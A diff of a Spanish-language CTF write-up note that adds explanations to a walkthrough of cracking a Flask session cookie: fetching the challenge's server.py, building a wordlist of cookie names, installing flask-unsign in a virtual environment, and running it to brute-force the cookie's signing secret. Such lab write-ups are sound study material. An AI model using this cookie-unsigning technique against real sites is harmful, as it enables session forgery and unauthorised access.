@@ -22,7 +22,7 @@ server.py           100%[================%3E]   1.97K  --.-KB/s    in 0s
 2025-04-05 21:46:24 (52.0 MB/s) - ‘server.py’ saved [2021/2021]
 ```
 
-Obtenemos una cookie:
+Entramos a la página web y obtenemos una cookie:
 >eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_HdKg.XyK72y474X2fO9bQdpyELl8rYb4
 
 Decodificamos la cookie:
@@ -97,7 +97,9 @@ def flag():
 if __name__ == "__main__":
         app.run()
 ```
+Este utiliza [[Flask Sessions Cookies]], como vimos que nos sugería la [[#Hints]]
 
+Instalamos pluma para facilitar la edición de archivos.
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo apt install pluma
@@ -203,7 +205,7 @@ Processing triggers for libc-bin (2.40-3) ...
 Setting up pluma (1.26.1-2.1) ...
 ```
 
-Separamos las posibles galletas.
+Separamos las posibles galletas usando pluma.
 
 ```txt
 snickerdoodle
@@ -236,6 +238,7 @@ black and white
 white chocolate macadamia
 ```
 
+Tratamos de instalar flask, pero nos genera problemas, por lo que generamos un [[Entornos Virtuales de Python|entorno virtual de python]].
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ sudo apt install flask-unsign
@@ -360,7 +363,7 @@ Installing collected packages: urllib3, markupsafe, itsdangerous, idna, click, c
 Successfully installed Jinja2-3.1.6 blinker-1.9.0 certifi-2025.1.31 charset-normalizer-3.4.1 click-8.1.8 flask-3.1.0 flask-unsign-1.2.1 idna-3.10 itsdangerous-2.2.0 markupsafe-3.0.2 requests-2.32.3 urllib3-2.3.0 werkzeug-3.1.3
 ```
 
-Realizamos un ataque de fuerza bruta:
+Realizamos un [[Ataque de Fuerza Bruta]]:
 ```bash
 ┌──(.venv)─(kali㉿kali)-[~]
 └─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_HdKg.XyK72y474X2fO9bQdpyELl8rYb4" --wordlist cookies.txt
